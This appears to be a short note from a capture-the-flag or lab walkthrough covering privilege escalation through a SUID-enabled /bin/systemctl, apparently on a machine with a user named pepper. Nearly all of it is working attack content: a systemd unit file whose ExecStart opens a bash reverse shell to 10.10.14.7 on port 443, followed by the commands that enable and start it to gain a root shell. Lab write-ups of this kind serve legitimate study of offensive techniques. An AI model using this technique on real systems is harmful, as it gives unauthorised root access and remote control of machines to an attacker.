![[Pasted image 20240903190447.png]]

Using linpeas.sh, found /bin/systemctl has SUID bit set

- Created root.service in /home/pepper/root.service
```
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'

[Install]
WantedBy=multi-user.target
```
- Enabling the root.service
```bash
/bin/systemctl enable /home/pepper/root.service
```
- Start root.service
```bash
/bin/systemctl start root
```
- Got shell as root 
![[Pasted image 20240903191030.png]]
